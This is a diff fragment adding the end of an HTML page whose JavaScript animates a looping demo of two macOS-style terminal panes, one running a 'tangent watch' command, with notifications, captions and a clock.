+    const inner = `opacity: ${clamp(1 - depth).toFixed(3)}`;
+    return `<div class="note" style="${style}"><img src="${icon}" alt="" style="${inner}"><div class="text" style="${inner}">
+      <div class="top"><span class="title">${esc(n.title)}</span><span class="when">now</span></div>
+      <div class="sub">${esc(n.sub)}</div><div class="body">${esc(n.body)}</div></div></div>`;
+  }).join('');
+}
+
+const left = document.getElementById('left'), right = document.getElementById('right');
+const skip = document.getElementById('skip');
+const capsEl = document.getElementById('caps');
+capsEl.innerHTML = CAPTIONS.map(c => `<div class="cap">${c[2]}</div>`).join('');
+
+const leftW = Math.round(LEFT_COLS * FONT_W + 24);
+const rightX = MARGIN + leftW + GAP;
+const rightW = 1280 - MARGIN - rightX;
+const RIGHT_COLS = Math.floor((rightW - 24) / FONT_W);
+const winH = 28 + 14 + ROWS * LINE_H;
+Object.assign(left.style, { left: MARGIN + 'px', width: leftW + 'px', height: winH + 'px' });
+Object.assign(right.style, { left: rightX + 'px', width: rightW + 'px', height: winH + 'px' });
+
+function render(t) {
+  const take = [...TAKES].reverse().find(k => t >= k.start);
+  const typingRight = t >= take.work - 0.15;
+  const watching = take.start > 0 || t >= 1.2;
+  drawPane(left, take.left, LEFT_COLS, t, take, !typingRight,
+    watching ? `admin — tangent watch mac --hosted — ${LEFT_COLS}×${ROWS}` : `admin — -zsh — ${LEFT_COLS}×${ROWS}`, false);
+  drawPane(right, take.right, RIGHT_COLS, t, take, typingRight, `admin — -zsh — ${RIGHT_COLS}×${ROWS}`, true);
+  left.querySelector('.shade').style.opacity = shade('left', t).toFixed(3);
+  right.querySelector('.shade').style.opacity = shade('right', t).toFixed(3);
+  document.getElementById('clock').textContent = clock(t, take);
+  skip.style.opacity = Math.max(0, between(t, take.skip[0], take.skip[1])).toFixed(3);
+  drawNotes(take, t);
+
+  [...capsEl.children].forEach((el, i) => {
+    const [a, b] = CAPTIONS[i];
+    el.style.opacity = Math.max(0, between(t, a, b)).toFixed(3);
+  });
+
+  // In from nothing and back to it, so the loop has no seam.
+  const outro = 26.6;
+  const fade = Math.min(ease(t / 0.25), 1 - ease((t - outro) / (DURATION - outro)));
+  for (const el of [left, right, capsEl]) el.style.opacity = fade.toFixed(3);
+}
+window.render = render;
+window.DURATION = DURATION;
+
+const held = new URLSearchParams(location.search).get('t');
+if (held !== null) render(parseFloat(held));
+else {
+  const start = performance.now();
+  const tick = now => { render(((now - start) / 1000) % DURATION); requestAnimationFrame(tick); };
+  requestAnimationFrame(tick);
+}
+</script>
+</body>
+</html>
